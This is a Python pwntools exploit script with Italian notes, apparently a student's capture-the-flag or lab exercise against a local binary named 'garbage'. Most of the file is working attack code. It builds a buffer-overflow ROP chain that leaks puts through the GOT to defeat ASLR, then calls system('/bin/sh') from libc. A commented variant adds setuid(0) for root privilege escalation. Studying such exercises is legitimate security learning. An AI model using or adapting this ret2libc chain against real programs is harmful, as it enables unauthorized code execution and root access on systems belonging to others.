#In questo caso ho ASRL attivo e quindi devo superarlo uso GOT PLT  (global offset table procedure linkage table) vedere cos'è (ha dentro gli indirizzi della libc, 
#quando il programma incontra una funzione vede se  la trova dentro la GOT)
#./garbage, vedo quanti char mi servono

from pwn import *

context(os = "Linux", arch="amd64")

#p.process("./garbage")

p = gdb.debug("./garbage", "b main")

#stessa cartella in cui è l'exploit
garbage = ELF("garbage")

rop = ROP(garbage)
libc= ELF("/lib/x86_64-linux-gnu/libc.so.6")

#è come usare ropper con pop rdi; ret;
rop.search(regs=['rdi'], order = "regs")

#cerco la puts nella GOT
rop.puts(garbage.got['puts'])

rop.call(garbage.symbols['main'])


log.info("Stage 1 ROP chain:\n"+rop.dump())

#buffer per buffer overflow
buf = b"A"*136
#mi serve trovare l'offset got_puts e di plt_puts

#payload automatico 
payload = buf + rop.chain()
p.sendline(payload)

#rimango in ascolto finchè non arrivo a access denied
p.recvuntil(b"access denied.\n")

#leggo fino all'ultimo carattere (con -1 tolgo il newline \n se no non leggo bene l'indirizzo)
#ljust lo mette nella forma 8 byte e aggiunge i null byte quando manca qualcosa
#faccio l'unpack
leaked_puts_address = u64(p.recvline()[:-1].ljust(8, b'\x00'))

#print in hex
print("leaked_puts_address: 0x%x " % leaked_puts_address)


#perchè mi serve sta puts?
#ldd garbage per trovare il path di libc
#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
libc_puts = libc.symbols['puts']



offset = leaked_puts_address - libc_puts

#modifico l'indirizzo di base della libc per trovare le funzioni che mi servono
libc.address = offset 

rop2=ROP(libc)

#ret per allineare lo stack
ret = rop2.find_gadget(['ret'])[0]
#prendo automaticamente la funzione system
rop2.system(next(libc.search(b'/bin/sh')))
log.info("LIBC ropchain:\n"+rop2.dump())

payload = buf +p64(ret)+ rop2.chain()
p.sendline(payload)


#così non si ferma il programma, se non lo metto lo script pyhton finisce e il debug si chiude
p.interactive()

#cosa faccio
#b main
#disass auth
#break indirizzo ret di auth
#c
#break main 


#usa ghidra per vedere quale funziona usa strcpy() 
#metti un breakpoint sulla ret di auth

#step 2 eseguo l'exploit per eseguire system per esempio





#posso anche fare una privilege escalation (innanzitutto devo fare chown root:root garbage e poi chmod 4777 garbage per settarlo che viene eseguito come root in ogni caso )
#trovo con readelf setuid() e gli passo 0 così prendo i permessi di root
"""
payload = buf + ret + pop_rdi+ p64(0) + libc_setuid 
payload+=pop_rdi + libc_binsh +libc_system
"""

#step 2 exploit

#per eseguire di nuovo il payload devo riportare il programma nel main all'inizio in modo da eseguire un nuovo payload